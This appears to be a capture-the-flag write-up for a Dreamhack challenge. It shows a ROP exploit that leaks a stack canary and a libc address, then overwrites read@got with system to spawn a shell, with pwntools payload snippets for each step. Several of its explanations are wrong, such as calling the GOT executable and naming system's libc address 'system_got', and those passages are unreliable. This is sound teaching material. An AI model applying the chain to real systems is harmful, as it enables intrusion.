# GOT overwrite

In ASLR & NX enabled environments, the process of gaining a shell requires the following steps:
0. Leak the stack canary
1. Leak a `libc` offset address(e.g. `read@libc`)
2. Calculate the base address of `libc` and locate `system`
3. Find the address of the  `/bin/sh` string
4. Overwrite a GOT entry with the address of `system`
5. Call the overwritten function to spawn a shell

One effective method for overwritting the return address is **GOT overwrite**. For instance, if we overwrite `printf@got` with `system@got`, then simply calling `printf` results in `system` being executed - potentially with a `/bin/sh` string as an argument.

Let's walk through this type of attack using the following challenge:
[Dreamhack](https://dreamhack.io/wargame/challenges/354)
## Source code

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

Above code has a clear vulnerability which is related to **the mismatch between the size of buffer and the read call**. The first read function accepts a size of `0x100` but actual size of the buffer is `0x30`, enabling a stack buffer overflow.

## 0. Leak canary

From the disassembly:
- `main<+17>` line tells us that canary value is located at `[rbp-0x8]`
- `main<+113>` tells us `&buf` is located at `[rbp-0x40]`.

So we can build a payload to leak canary like this:

```python
buf = b"A" * 0x39
payload = buf
```

Then read the canary as:

```python
p.recvuntil(buf)
cnry = u64(b"\x00" + p.recvn(7)) # LSB is null-byte
```

## 1. Leak a  `libc` offset
The next step is to get `libc` offset. The ultimate goal is to get `system@plt`, but it isn't added to plt. However `puts`, `write`, `read` and puts are.

![](https://i.imgur.com/1DwaOOS.png)
Given `libc.so.6` file, we can get the distance between `read/write/printf/puts@got` and `system@got`.

We can leak the address of `read@got` using `write(1, read@got, ...)` via ROP chain!

```python
read_got = e.got['read']
write_plt = e.plt['write']
...
payload = b"A" * 0x38 + p64(cnry) + b"B" * 0x8
payload += pop_rdi # gadget
payload += p64(1) # rdi
payload += pop_rsi_r15 # gadget
payload += p64(read_got) # rsi
payload += p64(0) # r15, junk value
payload += p64(write_plt) # RET

read_addr = p.recvn(6) + b"\x00" * 2 # Get read_got address
# Top 2 MSBs are null-byte
```

> **Q: Why we do not care `rdx` ?**
> The disassembly shows it's already set to 0x100, so we don't need to supply it manually.

## 2. Calculate `system` address

```python
libc_base = read_addr - libc.symbols['read']
system_got = libc_base + libc.symbols['system']
```

## 3. Get `/bin/sh` string
How can we get `/bin/sh` as a argument of `system` function? At a glance, I thought that I could inject `/bin/sh` directly to program stack. (That is, `0x68732f6e69622f`.) **But function arguments are passed as pointers**, and strings like `/bin/sh` reside in .data or .rodata, not on the stack, so what is saved in stack is an address to string, not string itself.

But in GOT overwrite, we can save `/bin/sh` in GOT, which is executable area.
## 4. GOT overwrite
We now overwrite `read@got` with `system`

```python
# read(0, read_got, ...)
payload += pop_rdi # gadget
payload += p64(0) # rdi
payload += pop_rsi_r15 # gadget
payload += p64(read_got) # rsi
payload += p64(0) # r15, junk value
payload += p64(read_plt) # RET

# GOT overwrite
p.send(p64(system_got) + b"/bin/sh\x00")
```

## 5. Execute `system("/bin/sh")`

We use `read@got + 0x8` to point to the `/bin/sh` string that we just wrote.

```python
payload += pop_rdi # gadget
payload += p64(read_got + 0x8)
payload += p64(read_plt)
```

But without the alignment gadget, this might crash with a SIGSEGV.

It would be caused by 16-byte alignment, so we should add a `ret` gadget.

```python
payload += pop_rdi # gadget
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)
```
